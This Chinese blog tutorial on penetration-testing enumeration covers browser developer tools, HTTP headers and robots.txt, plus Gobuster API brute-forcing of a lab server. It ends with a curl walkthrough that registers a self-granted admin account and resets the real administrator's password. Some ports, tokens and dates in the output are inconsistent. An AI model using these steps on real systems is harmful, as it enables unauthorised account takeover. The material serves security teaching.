---
title: "網頁應用服務枚舉"
date: 2025-10-10
description: "現今存在數種技巧可以直接從瀏覽器取得相關的資訊，現代瀏覽器裡的開發者工具可以協助我們進行枚舉，雖說開發者工具如其名應該是給網頁開發者使用的，但也很適合給我們在做滲透測試時取得目標服務的一些資訊"
hideTOC: false
targetKeyword: 網頁應用服務
draft: false
tags: 
  - "api"
  - "curl"
  - "debugger"
  - "http-header"
  - "rest-api"
  - "sitemap"
  - "標頭檔"
lang: zh
---
## 前言

我們之前提到被動式的搜集資訊找出網頁應用服務是很重要的任務，特別是當公開的程式庫或者Google搜尋引擎已經蒐錄進去的資料能夠讓我們找到目標洩漏出來的資訊，不論是利用洩漏出來的憑證，或者單純的服務說明文件，我們都應該在測試時驗證這些取得的資料，將被動式搜集到的材料當作線索找出更多沒發現過的路徑

在盲目的堆疊上許多技術之前，詳細認識每個元件的效果是很重要的，即使有些網頁應用服務的漏洞本身與技術是無關的，但還是有許多漏洞以及惡意內容需要根據服務技術底層精心設計過後才能打進去，諸如軟體的資料庫或者作業系統等等

所以在我們嘗試任何網頁應用服務的攻擊之前，我們應該深入了解有哪些技術架構可以利用，通常一套架構裡面包含底層的作業系統、網頁伺服器軟體、資料庫軟體以及前後端的子架構，利用先前[[web-application-security-assessment|網頁應用服務安全性評估]]的文章中介紹的方法及工具找到相對應的技術後，我們便可以來進行枚舉

現今存在數種技巧可以直接從瀏覽器取得相關的資訊，現代瀏覽器裡的開發者工具可以協助我們進行枚舉，雖說開發者工具如其名應該是給網頁開發者使用的，但也很適合給我們在做滲透測試時取得目標服務的一些資訊，實驗利用Firefox作為目標，畢竟在許多Linux裡這是預設的瀏覽器，但其他種的瀏覽器操作也大同小異

## 網頁內容Debug檢索

首先第一個不錯的切入點就是檢視URL位址裡的相關資訊，檢索該網域底下整個網頁由哪些檔案組成，可以讓我們更加了解背後的架構服務由哪套程式語言構成，例如，".php"寫成的服務內容就很直觀，不過通常網頁服務還會有其他種神秘的框架在裡頭，像是Java基底的網頁服務就可能用到".jsp"、".do"以及".html"檔案

不過現今網頁框架"Vue"、"React"以及"Angular"越來越盛行的情況下，直接引用目錄檔案看到副檔名的情況越來越少見，畢竟這些套件支援路由的概念設計，讓開發者只需要對應URI就可以拿到重複使用的元件，應用服務利用這些路由相對應的邏輯來回應使用者的需求，所以URI擴充檔案就不太使用到了

儘管URL檢索可以提供給我們一些關於目標網頁服務的線索，大部分的線索都可以從網頁的原始碼找到，例如Firefox Debugger工具(在Google Chrome裡叫做網頁開發者清單)就能夠顯示整個網頁所有用到的資源以及內容，只要有呈現出來的應用服務都會在裡頭，利用偵錯工具可以顯示JavaScript框架，裡面隱藏的輸入欄位、註解、使用者端的HTML元件、JavaScript等都可以找到

我們用Debugger來檢查一下secologies.com這個網頁

![secologies-debugger](https://media.secologies.com/secologies-debugger-scaled.webp)

在Debugger頁面底下我們看到這個網頁服務使用jQuery版本3.7.1的套件，這是一項常見的JavaScript函式庫，我們注意到這個檔案叫做"jquery.min.js"，意思是開發者將這個函式庫極簡化了，為的是讓程式碼所需耗費的檔案大小降低，所以會把換行通通拿掉讓code擠在一起

一般使用者很難閱讀函式庫內容，不過幸運的是我們可以用Firefox裡的修飾工具重新整理這個函式庫，按底下那個左右大括號的按鈕，就可以顯示出整理過且容易閱讀的code內容

![debugger-pretty](https://media.secologies.com/debugger-pretty-scaled.webp)
*[^1]*

另外在Inspector我們可以更加深入的探討網頁的內容，我們在某一篇文章底下的留言區找到任一個輸入的欄位，右鍵選取Inspect

![inspect-input-field](https://media.secologies.com/inspect-input-field.webp)

就會根據我們選取的位置打開Inspector來檢視該HTML相對應的欄位內容

![inspector-field](https://media.secologies.com/inspector-field-scaled.webp)

這項工具可以幫助我們快速的從HTML原始碼中找到隱藏的欄位，除了利用瀏覽器本身內建的工具之外，適時使用網路工具或者Burp Suite Proxy這類的工具檢視HTTP回應標頭檔也很重要

## 檢視HTTP回應標頭檔及Sitemap

除了從網頁服務端檢視內容，透過server的回應來得到額外的資訊也很有幫助，我們有兩個形式的工具可以協助我們，第一個是使用代理器，例如Burp Suite可以攔截用戶端跟Server端之間的請求與回應，另一項工具則是瀏覽器自己擁有的網路工具

首先我們先來測試瀏覽器內建的網路工具，我們一樣從Firefox裡的網頁開發者清單找到Network子頁面，這個子頁面工具主要蒐錄HTTP的請求與回應，我們打開後要重新整理一次頁面，這樣才能錄到所有網路行為的流量

![debugger-network](https://media.secologies.com/debugger-network-scaled.webp)

點擊其中一項請求就可以顯示更多的詳細資訊，特別要關注的是回應的標頭檔，回應標頭檔是送出請求時得到的HTTP回應

![Viewing-Response-Headers-in-the-Network-Tool](https://media.secologies.com/Viewing-Response-Headers-in-the-Network-Tool-.webp)
*[^1]*

特別在回應的Server標頭檔中通常會洩漏目標網頁伺服器軟體的名稱，在一般的設定下，甚至會把版本也回應過來，但要特別注意的是HTTP標頭檔並非都是由網頁伺服器產生，有些公司會用網頁代理器加上"X-Forwarded-For"標頭檔放在前面的話，請求資訊會經過Proxy才到網頁伺服器，而回應我們就只能看到"X-Forwarded"的標頭檔代替過原生的回應了

其實"X-"開頭的回應並非標準的HTTP標頭檔，而[RFC6648](https://datatracker.ietf.org/doc/html/rfc6648)標準現在已經捨棄了"X-"的形式，而採用更清楚的命名規則，畢竟回應標頭檔裡面的數值經常會洩漏出網頁伺服器使用的技術資訊，例如一些非標準的標頭檔"X-Powered-By"、"x-amz-cf-id"以及"X-Aspnet-Version"等等

如果讀者進一步的瞭解了更多的框架或服務便可以光是看到回應的數值就知道目標伺服器背後植基在哪些技術上，例如回應標頭檔出現"x-amz-cf-id"就是指說網頁服務有用到Amazon CloudFront

另外Sitemap也是其中一項我們在進行網頁服務枚舉時需要在意的元件，通常一個網站會放sitemap檔案來讓搜尋引擎找到網站可以爬取的內容，反之也會標示出哪些路徑是不可以爬取的，諸如像是儲存隱密資訊或者只有管理員權限才可以查看的網頁路徑，但這些被禁止的才是我們真正感興趣的(也是現在[LLM爬蟲](https://hshuang.com/posts/ai-vs-robots-txt/)最感興趣的)

sitemaps會顯示所有可以爬取的頁面，而"robots.txt"就是設置哪些路徑頁面不能被爬取的，舉例來說我們利用curl來看www.google.com的robots.txt試試

```
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```

Allow跟Disallow的規範之下設定讓會"尊重"網站的爬蟲來遵守只爬允許的，大部分這裡面的資訊Google就已經爬過了，所以並非滲透測試時感興趣的，甚至某些頁面對於下一階段的測試毫無幫助

儘管如此，有時候sitemap檔案還是不可忽視，有可能網管的設置錯誤而讓一些網站設計或有趣的資訊被放在裡面，例如我們沒注意到目標伺服器尚未被探索的目錄被蒐錄在裡面，就可以為我們提供一條新的路徑

## 枚舉與妄用API

在大部分的情境下，我們進行滲透測試的目標往往都是內部系統且封閉的服務環境，這種情況下我們通常只能倚賴API(Application Programming Interfaces)進行溝通，這些API都是回應網頁應用服務背後邏輯的介面

目前最常使用的API形式就是表現層狀態API(Representational State Transfer API, REST API)，用來回應數種目標的請求，連驗證都做得到，在一般的白箱測試環境下，我們可以取得完整的API文件來找出潛在的攻擊路徑，然而如果委託的是黑箱測試的話，我們就必須一個一個探索目標的API服務了

但要靠人力測試每一項可能的API又太耗時，這時候Gobuster就能派得上用場了，透過暴力破解方法對API的端口把全部有可能的功能都爆破出來，通常API的路徑之後會包含版本的編號，例如

```
/api_name/v1
```

另外API的名稱都會取的跟實際運作的功能或資料有非常直接的相關，畢竟就是要開放給其他人使用，不會取什麼"A", "B", "C"這種毫無頭緒的功能名稱的吧？我們來實驗用字詞表搭配Gobuster模擬API路徑的暴力破解方法，我們可以用"-p"來提供想要的模板

簡單測試的話我們在Kali裡模板想要像下列的方法一樣

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

我們在實驗中想要利用"{GOBUSTER}"裡的內容替換成字詞表裡的範例，並且把所有可能的版本都run過一遍，由於要全部測完得花些時間，所以我們先只挑兩個版本v1及v2，就可以利用gobuster來測試API枚舉

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

在實驗底下我們發現有好幾個字詞是有match到目標伺服器的API名稱，其中我們就會對/books/v1跟/users/v1這兩個API端口有興趣，而在某些公司他們會命名"/ui"這個路徑底下會有API所有的文件，雖然這在白箱測試時會很容易發現，但在黑箱測試時不太常遇到，就算發現了也可能需要一定的權限才能檢視

接著我們就可以對"/users"這個API路徑施行curl爬取

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```

這個API端口回應給我們三組使用者帳號，甚至其中一組是管理員的帳號，似乎有進一步探索的價值，我們可以利用這些線索來執行其他種Gobuster的暴力破解攻擊，這次我們就針對"admin"使用者帳號進行更小範圍的攻擊

為了驗證有無API是否跟使用者帳號的權限有掛勾，我們在API路徑底下再把"admin"帳號給加到結尾中

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/10/10 16:03:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

===============================================================
2025/10/10 16:03:40 Finished
===============================================================
```

結果吐出了一組"/password"的端口看起來很像我們的目標之一，所以我們在更進一步針對這個路徑做一次curl

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Fri, 10 Oct 2025 16:30:51 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

有趣的是，回應給我們的並非404 Not Found回應，取而代之的是405 METHOD NOT ALLOWED回應，代表這組API路徑真的可行，但由於我們的HTTP方法不支援，curl方法預設是送出GET請求，所以我們可以思考其他種方法來對"/password"這個API來進行互動，例如"POST"或者"PUT"等方法

如果這個API路徑可以接受POST或PUT方法的話代表我們可以操控使用者的憑證資訊，這裡的話我們應該要用管理員的密碼，在我們嘗試進行其他種方法之前，我們還應該要驗證使用者憑證可以被覆寫掉，我們可以根據"/login"這個API是否支援擴充URL內容

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Fri, 10 Oct 2025 16:31:30 GMT

{ "status": "fail", "message": "User not found"}
```

儘管回應給我們的是404 NOT FOUND狀態，代表沒有發現任何match的使用者帳號，但也清楚的顯示了這個API路徑是存在的，我們只需要找出適當的方法來互動即可

在我們已經知道某一個帳號名稱叫做"admin"時，我們就可以用這組帳號搭配一組密碼的方法來驗證，接著我們可以把GET的請求通通換成POST，把我們想要提供的資訊轉成JSON格式，首先造一組請求傳送"admin"這個帳號加上一組隨意的密碼包裝成JSON檔案

透過"-d"這個參數我們可以指定"Content-Type"成"json"格式，並且用"-H"這個參數放進我們的標頭檔中

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

API回應給我們顯示認證失敗，但也表示我們針對API需要的參數都提供正確的格式，由於我們不知道admin的密碼到底是什麼，我們來試試其他路徑，看看是否存在其他API可以繞過或者建立新的使用者，如果存在的話就表示有其他種攻擊層面可以嘗試

我們來試試看透過JSON格式的資料能不能讓我們註冊一組指定的使用者帳號跟密碼

```
kali@kali:~$curl -d '{"password":"lab","username":"hshuangadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```

此時API回應給我們失敗的資訊，但訊息是需要包含email信箱，機會來了，我們除了把JSON檔案裡加上email之外，額外測試能不能將這組帳號賦予管理員權限，如果API的判斷沒有其他驗證方法的話，我們利用"admin"這個條件試試能不能運作

```
kali@kali:~$curl -d '{"password":"lab","username":"hshuang","email":"hshuang@secologies.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

Bingo，在此實驗中我們沒收到任何error訊息了，這代表我們成功的註冊了一組新的使用者帳號，且這個帳號還有admin的權限，雖說這種設計一般來說是不允許的，哪有只靠API請求還不做任何驗證就可以拿到管理員權限的？

但在某些超老舊的系統中有可能發生的吧，接著我們就可以用這組新的身份驗證資訊來進行登入，一樣用我們找到的"/login" API來進行操作

```
kali@kali:~$curl -d '{"password":"lab","username":"hshuang"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```

這次我們就能成功的登入，並且拿到JSON Web Token(JWT)認證過的token，為了證實我們註冊的帳號是真的管理員用戶，我們應該用這組token來變更admin使用者的密碼，這次我們嘗試偽造POST請求針對"/password"這組API

```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

我們把取得到的JWT金鑰塞進認證標頭檔裡，並且賦予admin這個帳號一組新的密碼，但可惜的是伺服器回應該HTTP方法不支援，所以我們在進行其他種的方法試試，改用"PUT"這個方法(帶有PATCH)通常被用來取代POST請求，所以這個方法值得我們試試

```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

這次我們沒收到任何錯誤訊息，所以我們可以假設服務伺服器收到請求後並沒有出任何錯，而要驗證是否真的已經成功了，我們可以試試看登入"admin"這組帳號搭配方才我們變更的新密碼

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

這次就吐出成功的資訊了，這代表我們利用註冊使用者API功能成功的取得邏輯權限提升漏洞拿到admin這個帳號了，這種類型的設計錯誤會發生在建構網頁應用服務時過於倚賴某個API服務，如果在設計階段缺少足夠的測試或安全性撰寫策略就會忘記這項檢查

目前為止我們一直仰賴curl來手動的測試目標API服務，每一個不同的測試為了找出更好的路徑，但如果API的數量變多的話要檢查每一組就會花上許多時間，幸運的是上述的方法在Burp Suite上辦得到

例如我們重新把最後admin進行登入的嘗試透過代理器寄送，只要加上"--proxy 127.0.0.1:8080"的參數就可以轉過去了，一旦完成後我們可以在Burp Suite的Repeater頁面中建立新的請求，並且填寫之前我們提到的資訊進去

![Crafting-a-POST-request-in-Burp-for-API-testing-webenum_api01](https://media.secologies.com/Crafting-a-POST-request-in-Burp-for-API-testing-webenum_api01.webp)
*[^1]*

接著按下送出的按鈕，驗證回應的資訊狀態

![Inspecting-the-API-response-value](https://media.secologies.com/Inspecting-the-API-response-value-.webp)
*[^1]*

回應的成功資訊跟我們在curl裡一樣，代表我們一樣可以在proxy裡復現手動時的情形，這樣Burp Suite就可以記錄我們每一筆測試API的資訊，讓我們在針對每一步驟時都有可以參考的依據

一旦我們測試完好幾組API之後，我們還可以到"Target"頁面底下檢查每一筆發現的API以及Sitemap資訊，所有有效的路徑一併呈現出來，不管要寫成報告或展示都很方便

![Using-the-Site-Map-to-organize-API-testing-](https://media.secologies.com/Using-the-Site-Map-to-organize-API-testing-.webp)
*[^1]*

只要在Burp Suite裡的Site map頁面中，我們就可以針對發現的API進行轉寄的測試，不管要用Repeater或者Intruder做下一步的請求測試只要右鍵就辦得到

本文已經向各位讀者顯示出如何透過瀏覽器的控制台或者網路開發者工具debug網頁應用服務裡的資訊，同時我們也看到REST API在網頁應用服務中的角色，讓我們在黑箱滲透測試時有些參考來發現服務中的弱點，進一步的利用這些弱點，這些也是網頁開發者應該要了解的過程

[^1]: OffSec, “Introduction to Web Application Attacks: Web Application Enumeration,” The Penetration Testing with Kali Linux (PEN-200).
